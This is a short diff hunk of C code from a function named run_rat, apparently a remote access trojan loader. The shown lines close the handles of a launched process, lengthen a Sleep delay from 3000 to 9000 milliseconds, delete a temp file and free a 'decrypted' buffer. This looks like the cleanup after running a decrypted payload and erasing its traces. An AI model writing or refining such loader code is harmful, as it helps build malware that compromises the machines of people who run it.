@@ -128,7 +128,7 @@ void run_rat() {{
         
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
-        Sleep(3000);
+        Sleep(9000);
         DeleteFileA(temp);
     }}
     free(decrypted);
